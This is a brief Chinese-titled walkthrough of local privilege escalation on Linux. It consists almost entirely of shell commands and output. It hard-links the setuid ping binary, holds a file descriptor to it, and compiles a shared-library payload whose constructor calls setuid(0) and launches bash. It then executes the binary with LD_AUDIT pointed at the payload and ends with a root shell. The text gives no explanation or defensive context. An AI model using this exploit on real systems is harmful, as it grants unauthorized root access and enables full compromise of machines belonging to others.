###普通用户提权

            [test@ahu ~]$ mkdir /tmp/exploit
            [test@ahu ~]$ ln /bin/ping /tmp/exploit/target
            [test@ahu exploit]$  exec 3< /tmp/exploit/target
            [test@ahu exploit]$ ls -l /proc/$$/fd/3
            lr-x------ 1 test test 64 Aug 17 21:41 /proc/35612/fd/3 -> /tmp/exploit/target
            [test@ahu exploit]$ rm -rf /tmp/exploit/
            [test@ahu exploit]$ ls -l /proc/$$/fd/3
            [test@ahu ~]$ vim payload.c 
            void __attribute__((constructor)) init()     //在配置文件加入如下的内容
            {
                setuid(0);
                system("/bin/bash");
            }
            
            [test@ahu ~]$ gcc -w -fPIC -shared -o /tmp/exploit payload.c
            [test@ahu ~]$ ls -l /tmp/exploit
            [test@ahu ~]$ LD_AUDIT="$ORIGIN" exec /proc/self/fd/3
            Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
                        [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
                        [-M mtu discovery hint] [-S sndbuf]
                        [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
            [root@ahu ~]# whoami 
            root

